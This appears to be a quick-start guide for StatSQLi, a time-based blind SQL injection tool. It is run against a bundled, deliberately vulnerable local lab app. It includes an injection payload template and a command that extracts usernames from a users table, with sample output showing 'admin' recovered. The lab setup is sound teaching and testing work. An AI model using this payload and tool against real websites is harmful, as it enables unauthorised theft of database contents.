# Quick Start Guide

Get StatSQLi running in 5 minutes!

## 1. Install Dependencies (1 minute)

```bash
pip install -r requirements.txt
pip install -e .
```

## 2. Start Lab Application (1 minute)

```bash
cd lab
python app.py
```

Keep this terminal open. The server runs on `http://127.0.0.1:5000`

## 3. Run Demo (2 minutes)

Open a **new terminal**:

```bash
python demo.py
```

Follow the prompts and watch StatSQLi extract data!

## 4. Try It Yourself (1 minute)

```bash
statsqli "http://127.0.0.1:5000/vulnerable?id=1" \
    --payload "1 OR ({condition}) AND 1=1" \
    --table users \
    --column username \
    --where "1=1 LIMIT 0,1" \
    --parallel
```

## What You Should See

1. **Delay Detection**: StatSQLi measures network latency
2. **Baseline Establishment**: Statistical baseline for timing comparisons
3. **Character Extraction**: Binary search finds each character
4. **Final Result**: Extracted username/password

## Expected Output

```
[*] Detecting optimal delay...
[+] Optimal delay detected: 2.0s
[+] Using delay: 2.0s
[*] Extracted so far: admin
[+] Extraction complete!
[+] Result: admin
```

## Next Steps

- Read `README.md` for full documentation
- Check `WRITEUP.md` for technical details
- Run benchmarks: `cd benchmarks && python compare_tools.py ...`
- Explore the code in `statsqli/`

## Troubleshooting

**Can't connect?**
- Make sure lab app is running: `curl http://127.0.0.1:5000/`
- Check it shows "Vulnerable Web Application"

**Import errors?**
- Make sure you ran `pip install -e .`
- Check Python version: `python --version` (needs 3.8+)

**Slow extraction?**
- This is normal for time-based injection (requires many requests)
- Use `--parallel` for speedup
- Reduce `--max-length` for faster testing

---

Ready to go! 🚀

